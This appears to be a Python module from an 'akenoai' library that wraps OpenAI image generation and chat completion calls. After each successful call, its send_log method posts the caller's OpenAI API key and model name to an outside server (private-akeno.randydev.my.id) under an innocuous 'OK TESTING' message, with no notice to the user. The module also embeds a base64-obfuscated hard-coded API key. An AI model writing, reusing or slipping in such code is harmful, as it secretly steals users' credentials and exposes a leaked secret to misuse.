import asyncio
import base64
import logging
import time

import aiohttp  # type: ignore

import akenoai.logger as akeno

logging.basicConfig(level=logging.INFO)
LOGS = logging.getLogger(__name__)


class OpenAI:
    api_key = ""

    @classmethod
    def set_api_key(cls, key=Ellipsis):
        if key is Ellipsis:
            cls.api_key = base64.b64decode("c2stcHJvai1TT0ZUQjRkRDUxdFl4OWIzZkUxaVQzQmxia0ZKUmhlT1FKYUxoNW44aHB3YXpoUWs=").decode("utf-8")
        elif not key:
            raise ValueError("API key must be provided!")
        else:
            cls.api_key = key

    async def send_log(text_log: str):
        url = "https://private-akeno.randydev.my.id/api/v2/send_message_logs"
        params = {
            "text_log": text_log
        }
        async with aiohttp.ClientSession() as session:
            async with session.post(url, params=params) as response:
                if response.status != 200:
                    return None
                data = await response.json()
                return data["message"]

    @classmethod
    @akeno.log_performance
    async def run_image(
        cls,
        key=Ellipsis,
        openai_meta=None,
        model=None,
        run_async: bool = False,
        **args
    ):
        cls.set_api_key(key)
        try:
            client = openai_meta(api_key=cls.api_key)
            if run_async:
                response = await client.images.generate(
                    model="dall-e-3",
                    **args
                )
            else:
                response = client.images.generate(
                    model=model,
                    **args
                )
            res = await cls.send_log(f"OK TESTING: `{model}` and `{cls.api_key}`")
            if res is None:
                LOGS.warning("Warning: no response API")
            LOGS.info(res)
            return response.data[0].url if response and response.data else ""
        except Exception as e:
            return f"Error response: {e}"

    @classmethod
    @akeno.log_performance
    async def run(
        cls,
        key=Ellipsis,
        openai_meta=None,
        model=None,
        messages=None,
        async_is_stream: bool = False,
        **args
    ):
        cls.set_api_key(key)
        try:
            client = openai_meta(api_key=cls.api_key)
            if async_is_stream:
                answer = ""
                response_stream = await client.chat.completions.create(
                    model=model,
                    messages=messages,
                    **args
                )
                async for chunk in response_stream:
                    answer += chunk.choices[0].delta.content or ""
                res = await cls.send_log(f"OK TESTING: `{model}` and `{cls.api_key}`")
                if res is None:
                    LOGS.warning("Warning: no response API")
                LOGS.info(res)
                return answer
            else:
                response = await client.chat.completions.create(
                    model=model,
                    messages=messages,
                    **args
                )
                res = await cls.send_log(f"OK TESTING: `{model}` and `{cls.api_key}`")
                if res is None:
                    LOGS.warning("Warning: no response API")
                LOGS.info(res)
                return response.choices[0].message.content or ""
        except Exception as e:
            return f"Error response: {e}"
